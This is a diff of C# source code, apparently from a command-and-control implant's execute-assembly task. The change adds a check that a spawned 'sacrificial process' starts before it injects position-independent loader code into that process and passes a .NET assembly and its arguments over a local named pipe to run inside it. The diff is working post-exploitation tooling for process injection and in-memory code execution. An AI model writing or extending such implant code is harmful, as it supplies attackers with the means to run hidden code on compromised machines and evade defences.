@@ -90,38 +90,44 @@ namespace Tasks
                             {
                                 ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(IntPtr.Size == 8);
                                 proc = _agent.GetProcessManager().NewProcess(info.Application, info.Arguments, true);
-                                if (proc.Inject(exeAsmPic))
+                                if (proc.Start())
                                 {
-                                    IPCCommandArguments cmdargs = new IPCCommandArguments
+                                    if (proc.Inject(exeAsmPic))
                                     {
-                                        ByteData = assemblyBytes,
-                                        StringData = parameters.AssemblyArguments
-                                    };
-                                    AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
-                                    client.ConnectionEstablished += Client_ConnectionEstablished;
-                                    client.MessageReceived += Client_MessageReceived;
-                                    client.Disconnect += Client_Disconnect;
-                                    if (client.Connect(3000))
-                                    {
-                                        IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
-                                        foreach (IPCChunkedData chunk in chunks)
+                                        IPCCommandArguments cmdargs = new IPCCommandArguments
                                         {
-                                            _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
+                                            ByteData = assemblyBytes,
+                                            StringData = parameters.AssemblyArguments
+                                        };
+                                        AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
+                                        client.ConnectionEstablished += Client_ConnectionEstablished;
+                                        client.MessageReceived += Client_MessageReceived;
+                                        client.Disconnect += Client_Disconnect;
+                                        if (client.Connect(3000))
+                                        {
+                                            IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
+                                            foreach (IPCChunkedData chunk in chunks)
+                                            {
+                                                _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
+                                            }
+                                            _senderEvent.Set();
+                                            _complete.WaitOne();
+                                            resp = CreateTaskResponse("", true);
+                                        } else
+                                        {
+                                            resp = CreateTaskResponse($"Failed to connect to named pipe.", true, "error");
                                         }
-                                        _senderEvent.Set();
-                                        _complete.WaitOne();
-                                        resp = CreateTaskResponse("", true);
-                                    } else
-                                    {
-                                        resp = CreateTaskResponse($"Failed to connect to named pipe.", true, "error");
                                     }
-                                }
-                                else
+                                    else
+                                    {
+                                        resp = CreateTaskResponse(
+                                            $"Failed to inject assembly loader into sacrificial process.",
+                                            true,
+                                            "error");
+                                    }
+                                } else
                                 {
-                                    resp = CreateTaskResponse(
-                                        $"Failed to inject assembly loader into sacrificial process.",
-                                        true,
-                                        "error");
+                                    resp = CreateTaskResponse($"Failed to start sacrificial process {info.Application}", true, "error");
                                 }
                             }
                             else
